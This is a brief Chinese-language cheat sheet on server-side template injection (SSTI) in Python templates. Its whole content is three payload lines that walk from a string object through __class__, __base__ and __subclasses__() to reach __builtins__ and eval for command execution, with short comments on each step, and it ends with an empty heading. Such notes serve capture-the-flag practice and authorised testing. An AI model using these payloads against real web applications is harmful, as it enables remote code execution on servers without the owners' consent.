# SSTI

* ### 标准SSTI查询语句

```
''.__class__.__base__.__subclasses__() //返回子类列表
''.__class__.__base__.__subclasses__()[30].__init__ //查看第30位子类的init，返回<slot wrapper '__init__' of 'object' objects>则未被重载不存在init
''.__class__.__base__.__subclasses__()[5].__init__.__globals__['__builtins__']['eval']  //执行命令
```

### 



